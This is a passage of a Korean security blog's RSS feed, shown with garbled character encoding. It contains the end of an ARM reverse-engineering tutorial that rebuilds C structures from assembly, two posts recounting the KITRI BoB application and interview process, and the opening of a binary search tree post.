class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct3</span> &#123;</span></span><br><span class="line">    struct4 *unkc;  <span class="comment">// +0xc;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct4</span> &#123;</span>    <span class="comment">// í¬ê¸° 24ë°”ì´íŠ¸</span></span><br><span class="line">    <span class="type">char</span> unk16;     <span class="comment">// +0x16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>22í–‰, 23í–‰ì—ì„œ ë ˆì§€ìŠ¤í„° ê°’ì˜ ì •ìˆ˜ë°°ë¥¼ ì˜¤í”„ì…‹ìœ¼ë¡œ ì‚¬ìš©í•˜ê³  ìˆì–´, ë°°ì—´ì— ì ‘ê·¼í•˜ê³  ìˆìŒì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li>ë°°ì—´ì˜ ë² ì´ìŠ¤ ì£¼ì†ŒëŠ” 20í–‰ì˜ <code>[R1, #0xc]</code> ì´ê³ , ì˜¤í”„ì…‹ìœ¼ë¡œ <code>R3 * 3 * 8</code> ì„ ì—°ì‚°í•¨ì—ì„œ í¬ê¸°ê°€ 24ë°”ì´íŠ¸ì¸ <code>struct4</code> êµ¬ì¡°ì²´ë“¤ì˜ ë°°ì—´ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>ì˜¤í”„ì…‹ ê³„ì‚°ì— ì‚¬ìš©ëœ <code>R3</code> ì€ ì¸ë±ìŠ¤ë¡œ, 17í–‰ì—ì„œ <code>[R0, #0xc]</code> ë¥¼ ëŒ€ì…í•œ ê°’ì…ë‹ˆë‹¤.</li></ul></li><li>18í–‰, 24í–‰ì—ì„œ <code>[R0]</code> ì„ ì¸ìë¡œ <code>foo</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. (<code>foo</code> ì˜ ì¸ìëŠ” 1ê°œë¼ê³  ê°€ì •í•©ë‹ˆë‹¤)</li></ul><p>ë‚˜ë¨¸ì§€ ì½”ë“œëŠ” <code>foo</code> ì˜ ë¦¬í„´ê°’ê³¼ 23í–‰ì—ì„œ ëŒ€ì…í•œ <code>R4</code> ì— ëŒ€í•œ ë‹¨ìˆœ ë¶„ê¸°ë¬¸ë“¤ë¡œ, ë¶„ì„í•œ ë‚´ìš©ì„ C ì½”ë“œì— ì¶”ê°€í•˜ë©´ ëŒ€ê°•ì˜ ë¡œì§ê³¼ êµ¬ì¡°ì²´ ì‚¬ì´ì˜ ì°¸ì¡° ê´€ê³„ë¥¼ íŒŒì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *a1, struct2 *a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span> &#123;</span><br><span class="line">    <span class="type">char</span> v5;</span><br><span class="line">    <span class="type">int</span> v6;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a1.unk8 != s2.unk18</span><br><span class="line">        || a1.unk10 != <span class="number">2</span></span><br><span class="line">        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    v5 = a2-&gt;unkc-&gt;unkc[a1-&gt;unkc].unk16;</span><br><span class="line">    v6 = foo(a1-&gt;unk0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v6 == <span class="number">0x61</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v5 != <span class="number">0x61</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v6 != <span class="number">0x62</span> &amp;&amp; v5 &lt; <span class="number">0x63</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">ì°¸ê³ ìë£Œ</h2><p>[1] B. Dang, A. Gazet and E. Bachaalany, â€œARM,â€ in <em>Practical Reverse Engineering</em>. Indianapolis, IN: Wiley, 2014, pp. 39-77.</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Security/">Security</category>
      
      <category domain="https://juhyun167.github.io/categories/Security/System-Hacking/">System Hacking</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/07/02/arm-1-introduction/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>KITRI BoB 9ê¸° ìµœì¢…í•©ê²© / ì„œë¥˜, ë©´ì ‘ í›„ê¸° (2)</title>
      <link>https://juhyun167.github.io/2022/06/18/kitri-bob-9-2/</link>
      <guid>https://juhyun167.github.io/2022/06/18/kitri-bob-9-2/</guid>
      <pubDate>Sat, 18 Jun 2022 10:22:47 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;/2022/06/09/kitri-bob-9-1/&quot;&gt;ì´ì „ ê¸€&lt;/a&gt;ì—ì„œ ì´ì–´ì§€ëŠ” KITRI BoB í•©ê²© í›„ê¸°ì…ë‹ˆë‹¤. ì´ë²ˆ ê¸€ì—ì„œëŠ” ì œê°€ ì§€ì›í•œ</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><p><a href="/2022/06/09/kitri-bob-9-1/">ì´ì „ ê¸€</a>ì—ì„œ ì´ì–´ì§€ëŠ” KITRI BoB í•©ê²© í›„ê¸°ì…ë‹ˆë‹¤. ì´ë²ˆ ê¸€ì—ì„œëŠ” ì œê°€ ì§€ì›í•œ ì·¨ì•½ì ë¶„ì„ íŠ¸ë™ì˜ í•„ê¸°, ë©´ì ‘ ì „í˜• ê²½í—˜ì„ ê³µìœ í•´ë³´ë ¤ê³  í•©ë‹ˆë‹¤.</p><p><img src="/images/kitri-bob-9-2/1.png" alt="1.png"></p><h2 id="%ED%95%84%EA%B8%B0-%EC%A0%84%ED%98%95" tabindex="-1">í•„ê¸° ì „í˜•</h2><ul><li>ì˜¬í•´ ì²˜ìŒ ë„ì…ëœ CTFí˜• í•„ê¸° ì „í˜•ì…ë‹ˆë‹¤.</li><li>ê¸°ì¡´ í•„ê¸° ì „í˜•ê³¼ ìœ ì‚¬í•œ ê°ê´€ì‹ ëª‡ ë¬¸ì œë¥¼ ì œì™¸í•˜ë©´, ì‹¤ì œ íŒŒì¼ì„ ì£¼ê³  í”Œë˜ê·¸ë¥¼ ì°¾ì•„ write-upê³¼ í•¨ê»˜ ì—…ë¡œë“œí•´ì•¼ í•©ë‹ˆë‹¤.<ul><li>ì‹œìŠ¤í…œ í•´í‚¹, ì›¹ í•´í‚¹, ë¦¬ë²„ì‹±, ì•”í˜¸í•™ê³¼ ì•Œê³ ë¦¬ì¦˜ ë¬¸ì œê¹Œì§€ ì¶œì œë˜ì—ˆìŠµë‹ˆë‹¤.</li></ul></li><li>ì†”ì§íˆ ë§í•´ì„œ ì œì¼ ì‰¬ìš´ í•œ ë¬¸ì œ ë¹¼ê³ ëŠ” ì „ë¶€ ì‹œê°„ ë‚´ì— í’€ì§€ ëª»í–ˆìŠµë‹ˆë‹¤.</li><li>ë‹¤ìŒë‚  ë©˜íƒˆì„ ì¡ê³  ë‚˜ë¨¸ì§€ ë¬¸ì œë¥¼ ë³µê¸°í•œ ê²°ê³¼ ì´ëŸ° ê²°ë¡ ì„ ì–»ì—ˆìŠµë‹ˆë‹¤.<ul><li>ìƒê°ë³´ë‹¤ ë¬¸ì œëŠ” ì–´ë µì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</li><li>ê·¸ëŸ°ë° ë¶ˆì¹œì ˆí•œ ë¬¸ì œëŠ” ê½¤ ë§ìŠµë‹ˆë‹¤. (e.g. ì •ì  ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬)</li></ul></li><li>CTF ê²½í—˜ì´ ë§ì§€ ì•Šì€ ì´ˆì‹¬ì ë¶„ë“¤ì€ ë¶„ì„í•´ ë³¼ ë§Œí•œ ë¬¸ì œë¥¼ í•˜ë‚˜ ì¡ê³  ëê¹Œì§€ íŒŒê³ ë“œëŠ” ì „ëµì´ ìœ íš¨í•  ê²ƒ ê°™ìŠµë‹ˆë‹¤.<ul><li>ì‹œê°„ì´ ê½¤ ì´‰ë°•í•˜ë‹ˆ, ëª‡ ì‹œê°„ì”© ê±¸ë¦´ ê²ƒ ê°™ì€ ë¬¸ì œëŠ” ê³¼ê°íˆ í¬ê¸°í•˜ëŠ” í¸ì´ ë‚˜ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>ê·¸ë¦¬ê³  í•„ê¸° ì „í˜• í›„ì—ë„ í’€ì§€ ëª»í•œ ë¬¸ì œë¥¼ ê¼­ ë‹¤ì‹œ ì‚´í´ë´ì•¼ ë©´ì ‘ ì „í˜•ì—ì„œë„ ë„ì›€ì´ ë  ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤.<ul><li>ì¼ë¶€ ë©˜í† ë‹˜ì€ ê³ ë‚œë„ ë¬¸ì œì˜ í’€ì´ ë°©ë²•ì„ ë¬¼ì–´ë³´ëŠ” ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤.<br><br></li></ul></li></ul><p><img src="/images/kitri-bob-9-2/2.png" alt="2.png"></p><h2 id="%EB%A9%B4%EC%A0%91-%EC%A0%84%ED%98%95" tabindex="-1">ë©´ì ‘ ì „í˜•</h2><ul><li>ë©´ì ‘ë„ ë°”ë€Œì–´, ê¸°ì¡´ì˜ í•™ìŠµ ê³„íšì´ë‚˜ í•˜ê³  ì‹¶ì€ í”„ë¡œì íŠ¸ ë°œí‘œëŠ” ì§„í–‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</li><li>3ë¶„ ìê¸°ì†Œê°œê°€ ì¶”ê°€ë˜ì—ˆê³ , ì·¨ì•½ì ë¶„ì„ íŠ¸ë™ì€ ë°œí‘œìë£Œ ì—†ì´ êµ¬ë‘ë¡œ ì§„í–‰í•©ë‹ˆë‹¤.<ul><li>3ë¶„ ìê¸°ì†Œê°œë¥¼ ì¤€ë¹„í•˜ë©´ì„œ ìœ íŠœë¸Œ ì¸ì‹¸ë‹´ë‹¹ì ë‹˜ì˜ <a href="https://www.youtube.com/watch?v=DSBJXuDyDOY&amp;t=55s">ì˜ìƒ</a>ì´ ë§ì€ ë„ì›€ì´ ë˜ì—ˆìŠµë‹ˆë‹¤.</li><li>ê¸°ìˆ  ë©´ì ‘ì— ê°€ê¹Œìš´ ì„±ê²©ì„ ê³ ë ¤í•  ë•Œ, ìˆ˜ì‚¬ë²•ìœ¼ë¡œ ì—´ì •ì„ ê°•ì¡°í•˜ëŠ” ëŒ€ì‹  ë‚˜ëŠ” ì´ëŸ° ì‚¬ëŒì´ê³ , ì´ëŸ° ê²½í—˜ì„ í–ˆê³ , ì´ëŸ° ê±¸ ëŠë¼ê³  ë°°ì› ìœ¼ë©°, ì•ìœ¼ë¡œ ì´ëŸ° ì¼ì„ í•˜ê³  ì‹¶ì–´ ì§€ì›í–ˆë‹¤ëŠ” ë‚´ìš©ì„ ë‹´ë‹´íˆ ì´ì•¼ê¸°í•˜ëŠ” ê²ƒì´ ì¢‹ê² ìŠµë‹ˆë‹¤.</li><li>ì €ëŠ” ë‚´ìš©ì„ ì™¸ìš°ê³  ë°œí‘œí•˜ëŠ” í¸ì´ ê°•ì•½ì„ ì£¼ê±°ë‚˜ ê°ì •ì„ ì¡°ì ˆí•  ë•Œ ë„ì›€ì´ ë˜ì—ˆìŠµë‹ˆë‹¤.</li></ul></li><li>ì œê°€ ì…ì¥í•œ ë©´ì ‘ì‹¤ì€ ë©˜í† ë‹˜ ë‘ ë¶„ì— ì§€ì›ì ì„¸ ëª…ì´ ì…ì¥í–ˆìŠµë‹ˆë‹¤.</li><li>ì €ëŠ” ëŒ€ë¶€ë¶„ â€œ~ë¥¼ ê³µë¶€í–ˆë‹¤ê³  í–ˆëŠ”ë° ~ë¥¼ ì•„ëŠëƒâ€, &quot;~ì— ëŒ€í•´ ì„¤ëª…í•´ë³´ì•„ë¼&quot;ì™€ ê°™ì€ ì§ˆë¬¸ì„ ë°›ì•˜ìŠµë‹ˆë‹¤.<ul><li>IE 1-dayë¥¼ ê³µë¶€í–ˆë‹¤ëŠ” ë‚´ìš©ì—ì„œ &quot;IEì˜ MemGC ë³´í˜¸ ê¸°ë²•ì— ëŒ€í•´ í•™ìŠµí–ˆëŠëƒ&quot;ëŠ” ì§ˆë¬¸ì„ ë°›ì•˜ëŠ”ë°, ì†”ì§í•˜ê²Œ ì²˜ìŒ ë“¤ì–´ë³¸ë‹¤ê³  ë§ì”€ë“œë ¸ë”ë‹ˆ ë‹¤ìŒ ì§ˆë¬¸ìœ¼ë¡œ ë„˜ì–´ê°€ì…¨ìŠµë‹ˆë‹¤.</li></ul></li><li>ì œê°€ ë°›ì€ ì§ˆë¬¸ì˜ ê²½ìš° ëŒ€ë¶€ë¶„ ìê¸°ì†Œê°œì„œì™€ 3ë¶„ ìê¸°ì†Œê°œì—ì„œ ê²¹ì¹˜ëŠ” ì†Œì¬ì— ëŒ€í•œ ë‚´ìš©ì„ ë¬¼ì–´ë³´ì…¨ìŠµë‹ˆë‹¤.</li><li>ë”°ë¼ì„œ ì„œë¥˜ë‚˜ ìê¸°ì†Œê°œì— ê°•ì¡°í•œ ë‚´ìš©ì— ëŒ€í•´ì„œëŠ” ì˜ˆìƒ ì§ˆë¬¸ì„ ìŠ¤ìŠ¤ë¡œ ë§Œë“¤ì–´ ë³´ì‹œê³  ëŒ€ë¹„í•˜ëŠ” ê²ƒì´ ì¢‹ì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤.</li></ul><p>í•©ê²© ì´í›„ ë§ˆìŒì„ ì¶”ìŠ¤ë¦¬ê³  ì •ë¦¬í•´ ë³´ì•˜ëŠ”ë°, ë§ì€ ë¶„ë“¤ê»˜ ë„ì›€ì´ ë˜ì—ˆìœ¼ë©´ ì¢‹ê² ìŠµë‹ˆë‹¤. ê¸€ ë‚´ìš©ê³¼ ê´€ë ¨ëœ ì§ˆë¬¸ì€ ëŒ“ê¸€ì´ë‚˜ ì—°ë½ ì£¼ì‹œë©´ ìƒì„¸íˆ ë‹µë³€ë“œë¦¬ê² ìŠµë‹ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ BoB ì§€ì›ì˜ ì „ ê³¼ì •ì—ì„œ ì „í­ì ìœ¼ë¡œ ë„ì›€ì„ ë°›ì•˜ë˜ ê³ ë ¤ëŒ€í•™êµ ì´í¬ì¡° êµìˆ˜ë‹˜ê³¼ ê¹€ì˜í›ˆ ì„ ë°°, ê·¸ë¦¬ê³  ì‘ì›í•´ì£¼ì‹  ëª¨ë“  ë¶„ë“¤ê»˜ ê°ì‚¬ë“œë¦½ë‹ˆë‹¤.</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Thoughts/">Thoughts</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/06/18/kitri-bob-9-2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>KITRI BoB 9ê¸° ìµœì¢…í•©ê²© / ì„œë¥˜, ë©´ì ‘ í›„ê¸° (1)</title>
      <link>https://juhyun167.github.io/2022/06/09/kitri-bob-9-1/</link>
      <guid>https://juhyun167.github.io/2022/06/09/kitri-bob-9-1/</guid>
      <pubDate>Thu, 09 Jun 2022 17:47:23 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/images/kitri-bob-9-1/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;ê°ì‚¬í•˜ê²Œë„ ì ì§€ ì•Šì€ ë¶„ë“¤ì˜ í° ë„ì›€ìœ¼ë¡œ KITRI</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><p><img src="/images/kitri-bob-9-1/1.png" alt="1.png"></p><p>ê°ì‚¬í•˜ê²Œë„ ì ì§€ ì•Šì€ ë¶„ë“¤ì˜ í° ë„ì›€ìœ¼ë¡œ KITRI BoB 9ê¸°ì— ìµœì¢… í•©ê²©í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì´ë²ˆ ê¸€ì—ì„œëŠ” ê·¸ê°„ ì¤€ë¹„ ê³¼ì •ê³¼ ì„œë¥˜, ë©´ì ‘ ê²½í—˜ì„ ê³µìœ í•˜ì—¬ ë‹¤ë¥¸ ë¶„ë“¤ê»˜ ë§ì€ ë„ì›€ì´ ë˜ì—ˆìœ¼ë©´ í•©ë‹ˆë‹¤.</p><h2 id="%EC%A4%80%EB%B9%84-%EA%B3%BC%EC%A0%95" tabindex="-1">ì¤€ë¹„ ê³¼ì •</h2><ul><li>ê³µë¶€ëŠ” ê³ ë“±í•™ìƒ ë•Œ ì›¹ í•´í‚¹ì„ ì ê¹, ëŒ€í•™ ì§„í•™ í›„ ì‹œìŠ¤í…œ í•´í‚¹ì„ ì¼ë…„ ë°˜ ì •ë„ ê³µë¶€í–ˆìŠµë‹ˆë‹¤.</li><li>ê³µë¶€í•œ ë‚´ìš©ì„ ì£¼ë¡œ ë™ì•„ë¦¬ ìŠ¤í„°ë””ì—ì„œ ê³µìœ í•˜ë©´ì„œ, ë™ì•„ë¦¬ í™œë™ ê²½í—˜ ë¶€ë¶„ì—ì„œ í•  ì´ì•¼ê¸°ê°€ ë§ì•„ì¡ŒìŠµë‹ˆë‹¤.</li><li>ì£¼ë¡œ ì›Œê²Œì„ ë¬¸ì œë¥¼ í’€ë©´ì„œ ê³µë¶€í•œ ë‚´ìš©ì„ ë³µìŠµí–ˆìŠµë‹ˆë‹¤.<ul><li><a href="http://pwnable.kr/">pwnable.kr</a>ì„ ì ˆë°˜, <a href="https://pwnable.xyz/">pwnable.xyz</a>ëŠ” 7ë¬¸ì œ ì •ë„ ì œì™¸í•˜ê³  ì „ë¶€ í’€ì—ˆìŠµë‹ˆë‹¤.</li></ul></li></ul><h2 id="%EC%84%9C%EB%A5%98-%EC%A0%84%ED%98%95" tabindex="-1">ì„œë¥˜ ì „í˜•</h2><ul><li>ìê¸°ì†Œê°œì„œëŠ” 7ê°œ ë¬¸í•­ì— ê° 1,000ìì”©ìœ¼ë¡œ ì‘ë…„ê³¼ ë™ì¼í–ˆìŠµë‹ˆë‹¤.</li><li>ìê¸°ì†Œê°œ<ul><li>í•´í‚¹ì„ ì ‘í•˜ê³  ê³µë¶€í•˜ê²Œ ëœ ê³„ê¸°, ëŒ€í•™êµ 1~2í•™ë…„ ë•Œ ê³µë¶€í•˜ê³  í™œë™í•œ ì´ì•¼ê¸°ë¥¼ ì£¼ë¡œ ì ì—ˆìŠµë‹ˆë‹¤.</li><li>ì €ëŠ” ê³µë¶€í•  ë•Œ ë¬¸ì„œë‚˜ ë°±ì„œ, ì „ê³µì„œì ì„ ì°¸ê³ í•˜ëŠ” ê²ƒì„ ì¤‘ìš”í•˜ê²Œ ìƒê°í•˜ëŠ”ë°, ê·¸ ë¶€ë¶„ì„ ê°•ì¡°í•˜ì˜€ìŠµë‹ˆë‹¤.</li><li>ë³´ì•ˆê³¼ ê´€ë ¨ëœ ì–´ë–¤ ì£¼ì œë¥¼ ì™œ, ì–´ë–»ê²Œ ê³µë¶€í•´ì„œ ì–´ë–¤ ì„±ê³¼ë¥¼ ëƒˆëŠ”ì§€ê°€ ì¶©ë¶„íˆ í¬í•¨ë˜ë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li></ul></li><li>ë³¸ì¸ì´ ì´ë£¬ ê°€ì¥ í° ì„±ê³¼ ë° ì‚¬ë¡€<ul><li>ì „ê³µìˆ˜ì—…ì—ì„œ í•™êµ í¬í„¸ì‹œìŠ¤í…œì„ ëª¨ì˜í•´í‚¹í•  ê¸°íšŒê°€ ìˆì—ˆëŠ”ë°, ê·¸ ë•Œ ê²½í—˜ê³¼ ëŠë‚€ ì ì„ ì ì—ˆìŠµë‹ˆë‹¤.</li><li>ì´ í•­ëª©ì€ ê°œì¸ì°¨ê°€ í¬ê² ì§€ë§Œ, ì–´ë–¤ ê³„ê¸°ë¡œ ì–´ë–¤ ê¸°ìˆ ì„ ì‚¬ìš©í–ˆê³ , ì–´ë–¤ ê²ƒì„ ë°°ì› ë‹¤ëŠ” ë‚´ìš©ì´ë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li></ul></li><li>ì§€ì› ë™ê¸°<ul><li>ì €ëŠ” í¬ê²Œ ì§€ì›í•œ ì´ìœ ì™€, BoBì—ì„œ ë‚˜ ìì‹ ì„ ìœ„í•´, ì‚¬íšŒë¥¼ ìœ„í•´ í•˜ê³  ì‹¶ì€ ì¼ë¡œ ë‚˜ëˆ„ì—ˆìŠµë‹ˆë‹¤.</li><li>ì§€ì› ë™ê¸°ì—ì„œ ì—´ì •ê³¼ ëª©í‘œê°€ ë“œëŸ¬ë‚˜ê³ , ê·¸ ëª©í‘œë¥¼ ì‹¤í˜„ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì‹¤ë ¥ì´ë‚˜ ì ì¬ë ¥ì˜ ê·¼ê±°ê°€ ë‹¤ë¥¸ í•­ëª©ê³¼ ê°™ì´ ì¶©ë¶„íˆ ë“œëŸ¬ë‚˜ë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li></ul></li><li>í•©ê²© í›„ í¬ë¶€<ul><li>CTFì— ë‚˜ê°€ê³  ì‹¶ë‹¤, í˜„ì‹¤ ì‚¬ë¡€ë¥¼ ì´ì•¼ê¸°í•˜ë©° ì´ëŸ° í”„ë¡œì íŠ¸ë¥¼ í•´ë³´ê³  ì‹¶ë‹¤ëŠ” ë‚´ìš©ì„ ì£¼ë¡œ ì ì—ˆìŠµë‹ˆë‹¤.</li><li>ì´ í•­ëª©ì€ ì •ë§ BoBì—ì„œ í•˜ê³  ì‹¶ì€ ì¼ì„ ì¡°ë¦¬ìˆê²Œ ì ìœ¼ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤.</li></ul></li><li>ê´€ì‹¬ ë¶„ì•¼<ul><li>ì €ëŠ” ì‹œìŠ¤í…œ í•´í‚¹ ë¶„ì•¼ì—ì„œ ê³µë¶€í•˜ë©° ê¸°ë¡ì„ ë‚¨ê¸°ê³ , ë™ì•„ë¦¬ì›ë“¤ê³¼ ìŠ¤í„°ë””í•œ ì´ì•¼ê¸°ë¥¼ ì ì—ˆìŠµë‹ˆë‹¤.</li><li>ì§€ì›í•œ íŠ¸ë™ê³¼ ê´€ë ¨í•˜ì—¬ ê²½í—˜ì´ ì–´ëŠ ì •ë„ ìˆëŠ” ë¶„ë“¤ì€ ìƒì„¸í•œ ê²½í—˜ì„ ê´€ì‹¬ë¶„ì•¼ í•­ëª©ì— ë…¹ì—¬ë‚´ë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li><li>ê²½í—˜ì´ ë§ì§€ ì•Šì€ ë¶„ë“¤ë„ ì´ëŸ° ë¶„ì•¼ì— í¥ë¯¸ê°€ ìˆìœ¼ë©°, ê·¸ë˜ì„œ ì´ëŸ° ë‚´ìš©ì„ ì§€ê¸ˆ ê³µë¶€í•˜ê³  ìˆë‹¤ëŠ” ë‚´ìš©ì´ ìˆìœ¼ë©´ ì¶©ë¶„í•©ë‹ˆë‹¤.</li></ul></li><li>BoB í•™ìŠµê³„íš<ul><li>BoB í™ˆí˜ì´ì§€ì—ì„œëŠ” ê³µí†µ êµìœ¡ ê¸°ê°„ì— ëª¨ë“  íŠ¸ë™ì˜ ê¸°ì´ˆ ìˆ˜ì—…ì„, íŠ¸ë™ë³„ êµìœ¡ ë‹¨ê³„ì—ì„œ ì‹¬í™”ëœ ë‚´ìš©ì„ êµìœ¡í•œë‹¤ê³  ë°íˆê³  ìˆìŠµë‹ˆë‹¤.</li><li>ë”°ë¼ì„œ ê³µí†µ êµìœ¡ ë‹¨ê³„ì—ì„œ ê¸°ì´ˆì ì¸ ì†Œì–‘ì„ í‚¤ìš°ê³ , íŠ¸ë™ë³„ êµìœ¡ ë‹¨ê³„ì—ì„œ ë³¸ì¸ì´ ê´€ì‹¬ìˆëŠ” ë¶„ì•¼ì˜ ì´ë–¤ ì„¸ë¶€ì ì¸ ì£¼ì œë¥¼ ê³µë¶€í•˜ê² ë‹¤ëŠ” ë‚´ìš©ì´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li></ul></li><li>ì§„ë¡œ ê³„íš<ul><li>ì§„ë¡œ ê³„íšì€ í•™ìŠµ ê³„íšê³¼ ë‹¬ë¦¬ BoB ì´ìˆ˜ ì´í›„ì— ì´ˆì ì„ ë§ì¶˜ í•­ëª©ì…ë‹ˆë‹¤.</li><li>ê·¸ëŸ¬ë¯€ë¡œ ë© ì¸í„´, ì·¨ì—…, ì—°êµ¬ ë“±ì„ í†µí•´ ê´€ì‹¬ìˆëŠ” ë¶„ì•¼ì˜ ìµœì‹  ì£¼ì œë¥¼ ê³µë¶€í•˜ê³  ì „ë¬¸ê°€ê°€ ë˜ê² ë‹¤ëŠ” í¬ë¶€ë¥¼ ë°íˆë©´ ì¢‹ì„ ë“¯ í•©ë‹ˆë‹¤.</li></ul></li></ul><p>í•„ê¸°ì™€ ë©´ì ‘ ì´ì•¼ê¸°ëŠ” <a href="/2022/06/18/kitri-bob-9-2/">ë‹¤ìŒ ê¸€</a>ì—ì„œ ê³„ì†í•˜ê² ìŠµë‹ˆë‹¤. ì„œë¥˜ ì „í˜•ê³¼ ê´€ë ¨í•´ ì§ˆë¬¸ì´ ìˆìœ¼ì‹œë©´, ëŒ“ê¸€ì´ë‚˜ ì´ë©”ì¼ í†µí•´ì„œ ìµœëŒ€í•œ ë‹µë³€ ë“œë¦¬ê² ìŠµë‹ˆë‹¤!</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Thoughts/">Thoughts</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/06/09/kitri-bob-9-1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬</title>
      <link>https://juhyun167.github.io/2022/06/08/binary-search-tree/</link>
      <guid>https://juhyun167.github.io/2022/06/08/binary-search-tree/</guid>
      <pubDate>Wed, 08 Jun 2022 22:10:34 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;p&gt;ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì •ì˜ì™€ ì„±ì§ˆì„ ì‚´í´ë³´ê³  êµ¬í˜„í•´ ë³´ê² ìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED</description>
        
      
      
      
